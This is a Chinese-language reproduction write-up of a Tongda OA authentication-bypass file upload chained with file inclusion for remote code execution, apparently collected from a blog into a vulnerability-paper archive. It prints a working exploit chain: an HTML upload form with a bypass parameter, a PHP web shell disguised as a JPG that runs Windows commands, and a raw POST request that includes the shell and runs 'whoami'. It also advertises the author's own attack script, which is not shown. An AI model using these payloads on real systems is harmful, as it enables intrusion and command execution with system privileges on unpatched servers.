---
version: "**脚本使用方法:**"
source: "MrWQ/vulnerability-paper"
---

# 通达 OA 任意文件上传 + 文件包含 RCE 漏洞复现 (附自写 EXP)

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/PANDA-Mosen/p/13365342.html) **一、环境搭建：**

下载通达 OA 的安装包，根据提示点击下一步安装即可，安装完成，访问本机 ip 即可



 

**二、漏洞简介：**

可以绕过身份认证,，然后即可上传任意文件，配合文件包含即可造成 RCE 远程代码执行漏洞

 

**影响版本：**

V11 版、2017 版、2016 版、2015 版、2013 增强版、2013 版

 

 

**三、漏洞复现：**

**1、任意文件上传漏洞位置：**

```
/ispirit/im/upload.php
```



**2、构造 payload 上传文件：**

①将以下内容保存为 html：

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
<html>
<body>
<form action="http://127.0.0.1/ispirit/im/upload.php" method="post"  enctype="multipart/form-data">
<input  type="text"name='P' value = 1  ></input>    //用来绕过身份验证
<input  type="text"name='MSG_CATE' value = 'file'></input>
<input  type="text"name='UPLOAD_MODE' value = 1 ></input>
<input type="text"  value = 1></input>
<input type="file" ></input>
<input type="submit" ></input>
</body>
</html>
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

 

**②将以下内容保存为 shell.jpg:**

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
<?php
$command=$_POST['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

 

**③利用 html 文件上传 shell.jpg：**



 

**返回上传 shell.jpg 后的文件名信息：**



**3、利用文件包含漏洞进行 RCE：**

**文件包含漏洞位置：**

```
/ispirit/interface/gateway.php
```

 

**访问漏洞页面，并且把 GET 改成 POST，并修改、构造数据包，注意 Content-Type 是要手动加上的：**

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
POST /ispirit/interface/gateway.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=8phdj361a5d498n03tnqd7c104; KEY_RANDOMDATA=17743;PHPSESSID=8phdj361a5d498n03tnqd7c104;
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
 
json={"url":"/general/../../attach/im/2006/209898972.shell.jpg"}&cmd=whoami
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")



json 中的值，根据返回的文件名进行构造，例如： 2006_209898972|shell.jpg，那么就是上面这样构造

 

然后就可以进行 RCE 了，以系统权限执行任何命令

 

 

**4、利用脚本进行攻击（自己写的，支持的功能：①直接执行命令、②文件包含生成 webshell）：**

注意：脚本中的 gateway.php 文件的路径根据 OA 版本进行修改，例如：

```
2013版本：/ispirit/interface/gateway.php
2017版本：/mac/gateway.php
```

  **脚本使用方法:**

```
python3 TDoa_RCE 目标url -f 选择的功能
```

![](https://img2020.cnblogs.com/blog/2063846/202007/2063846-20200723113259363-1757148902.png)

生成 webshell

 ![](https://img2020.cnblogs.com/blog/2063846/202007/2063846-20200723113337751-1493871276.png)

脚本就不直接放在这了... 需要的可以联系我 (QQ 或者 wx 公众号后台留言)，注意：仅作为学习和讨论使用，禁止任何违法行为，与作者无关！

QQ：1254311935

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
